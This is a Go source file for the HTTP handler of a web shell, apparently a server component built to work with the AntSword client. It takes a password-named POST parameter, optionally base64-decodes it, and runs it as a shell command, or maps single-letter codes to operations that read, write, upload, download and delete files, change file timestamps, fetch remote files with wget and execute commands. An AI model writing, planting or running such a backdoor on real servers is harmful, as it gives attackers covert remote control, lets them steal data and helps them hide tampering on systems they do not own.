package server

import (
	"fmt"
	"net/http"

	"github.com/Wd0g/GoShell/lib/custom"

	"github.com/Wd0g/GoShell/lib/common"
)

type Handler struct {
	Pwd     string // 蚁剑连接密码
	Decoder string // 请求内容解码方式
	Mode    string // 运行方式：[shell, custom]
}

func (h Handler) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	// 检测参数
	var args string
	switch h.Decoder {
	case "base64":
		args = common.Base64Decode(req.PostFormValue(h.Pwd))
	case "plain":
		args = req.PostFormValue(h.Pwd)
	default:
		args = req.PostFormValue(h.Pwd)
	}

	if args == "" {
		return
	}

	if h.Mode == "cmd" {
		res, _ := common.Shell(args, "sh")
		w.Write([]byte(res))
		return
	}

	if h.Mode == "custom" {
		var res interface{}
		var err error
		switch args {
		case "A":
			res, err = custom.BaseInfo()
		case "B":
			res, err = custom.FileTree(req.PostFormValue("z1"))
		case "C":
			res, err = custom.ReadFile(req.PostFormValue("z1"))
		case "D":
			res, err = custom.WriteFile(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "E":
			res, err = custom.DeleteFileOrDir(req.PostFormValue("z1"))
		case "F":
			res, err = custom.DownloadFile(req.PostFormValue("z1"))
		case "U":
			res, err = custom.UploadFile(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "H":
			res, err = custom.CopyFileOrDir(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "I":
			res, err = custom.RenameFileOrDir(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "J":
			res, err = custom.CreateDir(req.PostFormValue("z1"))
		case "K":
			res, err = custom.ModifyFileOrDirTime(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "L":
			res, err = custom.Wget(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "M":
			res, err = custom.ExecuteCommand(req.PostFormValue("z1"), req.PostFormValue("z2"))
		case "Z":
			res, err = custom.TestSupportDBClient()
		}

		if err != nil {
			res = fmt.Sprintf("ERROR://%s", err.Error())
		}
		w.Write([]byte(fmt.Sprintf("->|%s|<-", res)))

		return
	}

}
